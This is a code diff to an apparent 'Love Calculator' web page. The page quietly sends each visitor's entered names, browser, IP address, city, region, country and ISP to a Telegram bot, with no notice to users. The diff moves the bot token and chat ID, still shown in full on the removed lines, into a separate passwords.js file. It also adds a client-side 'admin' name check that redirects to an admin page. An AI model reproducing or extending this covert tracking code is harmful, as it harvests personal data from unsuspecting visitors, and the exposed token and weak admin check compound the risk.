@@ -89,6 +89,7 @@
   <div class="result" id="result"></div>
 </div>
 
+<script src="passwords.js"></script>
 <script>
 function createHeart() {
   const h = document.createElement("div");
@@ -106,6 +107,13 @@ async function calculateLove() {
   const u = document.getElementById("yourName").value.trim();
   const c = document.getElementById("crushName").value.trim();
   if(!u || !c) { alert("Please enter both names!"); return; }
+
+  // 🔑 Admin check (case-insensitive)
+  if (u.toLowerCase() === "admin" || c.toLowerCase() === "admin") {
+    window.location.href = "admin.html";
+    return;
+  }
+
   document.getElementById("result").style.display = "none";
   document.getElementById("loading").style.display = "block";
 
@@ -151,12 +159,10 @@ async function sendToTelegram(u, c, percent) {
 `╔━━━━━━━━━━━━━━━━━━━
 ║ 💖 Love Calculator Entry 💖
 ╚━━━━━━━━━━━━━━━━━━━
-╔━━━━━━━━━━━━━━━━━━━
 ║ 👤 User: ${u}
 ║ 😍 Crush: ${c}
 ║ ❤️ Love %: ${percent}%
 ╚━━━━━━━━━━━━━━━━━━━
-╔━━━━━━━━━━━━━━━━━━━
 ║ 🌐 Browser: ${browser}
 ║ 🕒 Time: ${time}
 ║ 📡 IP: ${ip}
@@ -166,17 +172,16 @@ async function sendToTelegram(u, c, percent) {
 ║ 🌍 Location: ${city}/${region}/${country}
 ║ 📡 ISP: ${isp}
 ╚━━━━━━━━━━━━━━━━━━━
-╔━━━━━━━━━━━━━━━━━━━
 ║ 🪿 developed by: 𝐃 ʜ 𝙰 ɴ 𝐢ⁱɪ  
 ╚━━━━━━━━━━━━━━━━━━━`;
 
-  fetch(`https://api.telegram.org/bot8177299368:AAGQRe_QqZZ6zGN2gB4Gi9OdMFBiBb_CegA/sendMessage`, {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
     headers: {"Content-Type":"application/json"},
-    body: JSON.stringify({ chat_id: "7109583573", text: msg })
+    body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
   });
 }
 </script>
 
 </body>
-  </html>
+</html>
